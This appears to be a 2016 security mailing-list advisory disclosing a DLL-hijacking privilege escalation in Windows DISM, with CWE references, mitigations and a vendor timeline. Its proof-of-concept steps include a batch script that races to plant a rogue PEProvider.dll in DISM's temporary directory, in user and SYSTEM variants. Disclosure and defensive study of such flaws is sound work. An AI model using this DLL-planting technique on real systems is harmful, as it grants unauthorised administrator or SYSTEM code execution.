@@ -1,0 +1,187 @@
+
+Date: Sat, 23 Jul 2016 13:14:22 +0200
+From: "Stefan Kanthak" <stefan.kanthak@...go.de>
+To: <bugtraq@...urityfocus.com>
+Cc: fulldisclosure@...lists.org
+Subject: [FD] Defense in depth -- the Microsoft way (part 41): vulnerable by
+	(poor implementation of bad) design
+
+Hi @ll,
+
+Windows 7 introduced the "Deployment Image Servicing and Management"
+tool DISM.exe; this command line program is called for example by
+its predecessor PkgMgr.exe (a GUI program which requests elevated
+privileges), or by Windows Update (which runs under SYSTEM account).
+
+DISM.exe needs to be run with administrative privileges:
+this condition is met in both cases named above.
+
+When called with valid arguments, DISM.exe creates a directory
+"%TEMP%\<new GUID>\" (which inherits the ACL of its parent), copies
+the contents of the directory "%SystemRoot%\System32\DISM\" into
+the newly created unique directory and then runs (the copy of)
+DISMHOST.exe there.
+
+When DISM.exe is called under SYSTEM account, %TEMP% resolves to
+"%SystemRoot%\Temp"; when DISM.exe is called under a user account,
+%TEMP% resolves to "%USERPROFILE%\AppData\Local\Temp" alias
+"%LOCALAPPDATA%\Temp".
+
+DISMHOST.exe tries to load PEProvider.dll, a DLL not present in
+Windows, from "%TEMP%\<new GUID>\".
+
+In the "protected" alias UAC-controlled administrator account
+created during Windows setup [*], "%TEMP%\<new GUID>\" is writable
+without administrative privileges: the unprivileged user (or any
+process running without elevation under this user account) can
+watch for the creation of this directory and then copy an arbitrary
+(rogue) DLL as PEProvider.dll.
+
+DISMHOST.exe loads and executes PEProvider.dll with administrative
+privileges, resulting in an escalation of privilege.
+
+
+The two weaknesses exploited here are of course well-known and well-
+documented:
+
+* for the unsafe TEMP directory see
+  <https://cwe.mitre.org/data/definitions/379.html>;
+
+* for the DLL hijacking see
+  <https://cwe.mitre.org/data/definitions/426.html> and
+  <https://cwe.mitre.org/data/definitions/427.html> plus
+  <https://capec.mitre.org/data/definitions/471.html>.
+
+
+Proof of concepts/demonstrations:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+In the user account created during Windows setup perform the
+following steps:
+
+1. download <http://home.arcor.de/skanthak/download/SENTINEL.DLL>
+   and save it as PEProvider.dll in an arbitrary directory, for
+   example your "Downloads" folder
+   (on 64-bit Windows use the 64-bit SENTINEL.DLL available in
+   <http://home.arcor.de/skanthak/download/SENTINEL.CAB>: extract
+   it and rename it to PEProvider.dll)
+
+2. save the following 7 lines as foobar.xml anywhere you like, for
+   example in your "Downloads" folder:
+
+   <?xml version="1.0" encoding="utf-8" standalone="yes"?>
+   <unattend xmlns="urn:schemas-microsoft-com:unattend">
+       <servicing>
+           <package action="Configure">
+           </package>
+       </servicing>
+   </unattend>
+
+3. save the following 4 lines as PEProvider.cmd anywhere you like,
+   for example in your "Downloads" folder:
+
+   :WAIT
+   @If Not Exist "%TEMP%\????????-????-????-????-????????????" Goto :WAIT
+   For /D %%! In ("%TEMP%\????????-????-????-????-????????????") Do Set foobar=%%!
+   Copy "%USERPROFILE%\Downloads\PEProvider.dll" "%foobar%"
+
+   and start this batch script per double-click, or using the
+   the following command line per Start->Run:
+       %COMSPEC% /K Call "%USERPROFILE%\Downloads\PEProvider.cmd"
+
+4. run the following command line per Start->Run:
+       PkgMgr.exe /N:"%USERPROFILE%\Downloads\foobar.xml"
+
+5. notice the message boxes displayed by PEProvider.dll loaded
+   and executed from DISMHOST.exe: PWNED!
+
+
+This second proof of concept works under the same preconditions as
+<https://bugs.chromium.org/p/project-zero/issues/detail?id=440>
+
+
+In ANY user account that can create files in "%SystemRoot%\Temp\"
+(see <https://support.microsoft.com/en-us/kb/950934> as example how
+to achieve this) perform the following steps:
+
+1. download <http://home.arcor.de/skanthak/download/SENTINEL.DLL>
+   and save it as PEProvider.dll in an arbitrary directory, for
+   example your "Downloads" folder
+   (on 64-bit Windows use the 64-bit SENTINEL.DLL available in
+   <http://home.arcor.de/skanthak/download/SENTINEL.CAB>: extract
+   it and rename it to PEProvider.dll)
+
+2. save the following 4 lines as PEProvider.cmd anywhere you like,
+   for example in your "Downloads" folder:
+
+   :WAIT
+   @If Not Exist "%SystemRoot%\Temp\????????-????-????-????-????????????" Goto :WAIT
+   For /D %%! In ("%SystemRoot%\Temp\????????-????-????-????-????????????") Do Set foobar=%%!
+   Copy "%USERPROFILE%\Downloads\PEProvider.dll" "%foobar%"
+
+   and start this batch script per double-click, or using the
+   the following command line per Start->Run:
+       %COMSPEC% /K Call "%USERPROFILE%\Downloads\PEProvider.cmd"
+
+3. just wait ... DISM.exe will run in the background, sooner or
+   later: PWNED!
+
+
+Mitigation:
+~~~~~~~~~~~
+
+* Don't use "protected" administrator accounts, NEVER!
+
+* Disable the default user account created during Windows setup,
+  or demote it to a standard user account.
+
+* Always use standard user accounts with DISABLED UAC-elevation.
+
+* Practice STRICT privilege separation: UAC is a VERY BAD joke!
+
+* Add an ACE "(D;OIIO;WP;;;WD)" to the ACL of "%TEMP%"; use
+  <https://msdn.microsoft.com/en-us/library/aa374928.aspx> to
+  decode it to "deny execution of files in this directory for
+  everyone, inheritable to all files in all subdirectories".
+
+
+stay tuned
+Stefan Kanthak
+
+
+[*] according to Microsoft's own SIR reports, more than half of
+    the Windows installations which send telemetry data have only
+    one active user account, i.e. some hundred million Windows
+    installations are susceptible to this design bug!
+
+
+Timeline:
+~~~~~~~~~
+
+2016-05-31    vulnerability report sent to vendor
+
+2016-06-02    vendor replies, opens MSRC Case 33699
+
+              no more replies for 6 long weeks, despite
+              <http://home.arcor.de/skanthak/policy.html>
+
+2016-07-14    status request sent to vendor
+
+2016-07-15    vendor replies:
+              "DISM will create a temporary directory inside the
+               administrators %TEMP%, which normal/standard users
+               do NOT have access to.
+               As such, we are resolving this as 'by design'."
+
+2016-07-15    OUCH!
+              "There is no separate 'administrators' %TEMP% in the
+               default user account created during Windows setup!"
+
+              NO RESPONSE
+
+2016-07-23    report published
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
